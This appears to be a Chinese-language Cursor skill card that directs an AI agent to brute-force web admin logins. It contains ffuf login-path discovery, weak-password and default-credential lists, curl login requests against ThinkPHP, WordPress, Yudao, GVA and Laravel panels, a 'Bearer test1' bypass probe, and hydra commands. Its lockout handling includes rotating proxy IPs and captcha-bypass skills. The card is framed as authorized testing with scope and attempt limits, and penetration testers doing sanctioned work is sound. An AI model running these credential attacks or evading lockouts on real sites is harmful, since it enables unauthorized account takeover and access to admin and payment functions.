---
name: 黑楼兰·硬撼
description: >-
 授权站登录面短字典弱口：/admin/login、/api/login、wp-login。
 
 PMA/宝塔走 panel_surface_probe；Nacos/Druid/Grafana 走专卡；锁号即停。
 旧名 `auth-sec` / `auth-agent` / `password-attacks-credential-access` 已并入本卡。登录注入走 `authbypass-authentication-flaws`。
---

> **黑楼兰**
> 力破王庭不回头，楼兰一怒血浇丘。
> 真武之体硬撼天，成败都在拳里头。

# 弱口令与认证爆破（Cursor Skill）

## 真源

1. `传承/黑楼兰·硬撼.md`
2. `python3 炼蛊房/auth_brute_probe.py -u https://授权站 --case <案卷>`
3. 缺站点字典时：`python3 炼蛊房/stdlib_fallback.py wordlist_gen -- -u https://授权站`

## 强制

1. 目标在 scope。默认 `--limit 24`，禁止无上限 hydra。
2. `locked=true` → 停撞，换验证码/极验卡或写复工。
3. L2 命中立刻填对象矩阵，禁止「能登录」当结案。
4. 面板口走 `宝塔台.md`。

---

## 一、指纹识别与登录面发现

```bash
# 快速扫后台登录路径（ffuf 字典爆破）
ffuf -u https://<目标>/FUZZ -w /usr/share/wordlists/dirb/common.txt \
 -mc 200,301,302 -fc 404 -t 30 -timeout 10 \
 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" 2>/dev/null | grep -iE 'admin|login|manage|backend|console'

# 常见后台路径（手动验证）
# /admin /admin/login /admin/index /backend
# /manage /manage/login /console /dashboard
# /wp-admin /wp-login.php /phpmyadmin
# /api/login /api/auth/login /api/v1/auth/login
# /user/login /member/login /operator/login

# 检查响应特征（HTML title / form action / JS框架）
curl -sk https://<目标>/admin/login -L | grep -iE '<title>|form action|X-Powered-By|Vue|React'
```

---

## 二、弱口令字典（默认优先级顺序）

```
# 超短必试（≤5次，无论有无锁）
admin:admin
admin:admin123
admin:Admin123
admin:admin@123
admin:123456
admin:password
admin:12345678
root:root
root:toor
test:test123

# 业务特征密码（从域名/公司名衍生）
<域名前缀>123
<域名前缀>@2024
<域名前缀>888
<公司缩写>2024
Q@zwsx123 # 极常见弱口
Aa@123456
Admin@2024
Admin888
```

---

## 三、具体场景命令

### 3.1 ThinkPHP / FastAdmin 类后台

```bash
# 工具：auth_brute_probe.py 自动检测锁定
python3 炼蛊房/auth_brute_probe.py \
 -u https://<授权站>/admin/login \
 --user admin \
 --dict 炼蛊房/dict/admin_pass_short.txt \
 --limit 24 --delay 1.5 \
 --case <案卷>

# 手动 curl 验证登录（ThinkPHP JSON 接口）
curl -sk https://<授权站>/admin/login -X POST \
 -H 'Content-Type: application/json' \
 -H 'X-Requested-With: XMLHttpRequest' \
 -d '{"username":"admin","password":"admin123"}' | python3 -m json.tool
```

### 3.2 WordPress wp-login.php

```bash
# WPScan 弱口令探测（授权站）
wpscan --url https://<授权站> --usernames admin,administrator \
 --passwords 炼蛊房/dict/wp_pass_short.txt \
 --max-threads 3 --request-timeout 15 2>/dev/null

# 手动 POST wp-login
curl -sk https://<授权站>/wp-login.php -c /tmp/wp_cookie.txt -X POST \
 -d 'log=admin&pwd=admin123&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' \
 -H 'Cookie: wordpress_test_cookie=WP+Cookie+check' \
 -L | grep -iE 'Dashboard|wp-admin|incorrect|错误'
```

### 3.3 芋道 / Spring Boot 类 API

```bash
# 芋道后台登录（admin-api）
curl -sk https://<授权站>/admin-api/system/auth/login -X POST \
 -H 'Content-Type: application/json' \
 -d '{"username":"admin","password":"admin123","captchaVerification":""}' \
 | python3 -m json.tool

# Bearer test1 快速尝试（芋道特有）
curl -sk https://<授权站>/admin-api/system/user/page \
 -H 'Authorization: Bearer test1' | python3 -m json.tool
```

### 3.4 GVA (Gin-Vue-Admin) 类

```bash
# GVA 登录接口
curl -sk https://<授权站>/api/base/login -X POST \
 -H 'Content-Type: application/json' \
 -d '{"username":"admin","password":"Admin@123456","captcha":"","captchaId":""}' \
 | python3 -m json.tool

# 常见 GVA 默认密码
# admin:Admin@123456 admin:Admin@123 admin:Admin123456 admin:123456
```

### 3.5 Laravel / Vue3 SPA 类（epay 模板）

```bash
# 先获取 CSRF token
CSRF=$(curl -sk https://<授权站>/admin/ | grep -o 'csrf-token" content="[^"]*"' | cut -d'"' -f3)

# 再发登录
curl -sk https://<授权站>/admin/auth/login -X POST \
 -H 'Content-Type: application/json' \
 -H 'X-Requested-With: XMLHttpRequest' \
 -H "Referer: https://<授权站>/admin/" \
 -d '{"username":"admin","password":"admin123","enc":0}' \
 | python3 -m json.tool
```

### 3.6 hydra 快速爆破（明确无锁时使用）

```bash
# HTTP POST JSON 接口（需要 hydra ≥ v9）
hydra -l admin -P 炼蛊房/dict/admin_pass_short.txt \
 <授权IP> https-post-form \
 "/admin/auth/login:username=^USER^&password=^PASS^:S=token" \
 -t 4 -w 3 -f -o /tmp/hydra_result.txt

# 限速版（避免锁号）
hydra -l admin -P 炼蛊房/dict/admin_pass_short.txt \
 <授权IP> https-post-form \
 "/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:F=error" \
 -t 1 -w 5 -f
```

---

## 四、锁号检测与处理

```bash
# 锁号特征关键词（检查响应体）
# ThinkPHP: "你还可以尝试N次" / "已被锁定" / "暂时禁止"
# FastAdmin: "账号或密码错误，请重试" + 计数
# WordPress: "ERROR: Too many failed login attempts"
# GVA: {"code":7,"msg":"验证码错误"}（验证码挡在密码之前）

# 检测是否锁定的探针请求
curl -sk https://<授权站>/admin/login -X POST \
 -H 'Content-Type: application/json' \
 -d '{"username":"admin","password":"locktest_$(date +%s)"}' \
 | python3 -m json.tool
```

**锁号后处理流程**：
1. 停止爆破，记录已尝试密码
2. 等待锁定窗口（通常 10-30 分钟）或换代理 IP（`config/proxy-nodes.txt`）
3. 有验证码/极验 → 走 `captcha-ocr` / `geetest-captcha-bypass` skill
4. 无法绕过 → 在 TRIAGE.md 记录复工条件 `session_pipeline 通过`

---

## 五、默认凭据速查表

| 系统 | 常见默认账户 | 常见默认密码 |
|------|------------|------------|
| Nacos | nacos | nacos |
| Grafana | admin | admin |
| Druid Monitor | - | （无默认鉴权） |
| Jenkins | admin | （安装时设置） |
| phpMyAdmin | root | （空/root） |
| Nexus | admin | admin123 |
| Harbor | admin | Harbor12345 |
| Gitlab | root | 5iveL!fe |
| Portainer | admin | （首次设置） |
| Kibana | elastic | changeme |
| RabbitMQ Management | guest | guest |

---

## 六、成功口径

| 级别 | 条件 |
|------|------|
| L1 | 发现登录面且枚举出用户名 |
| L2 | 成功登录（弱口令命中，可获取 token/session） |
| L3 | 登录后有管理权限（用户列表/配置/支付操作等） |

## 七、红线

- **无上限爆破**：必须设 `--limit`，严格计数
- **锁号不停**：检测到锁定特征立即停止
- **接管后忘填矩阵**：L2 命中必须填 `案卷/object_matrix.md`
- **Nacos/Druid/Grafana 走专卡**，不要用本卡重复
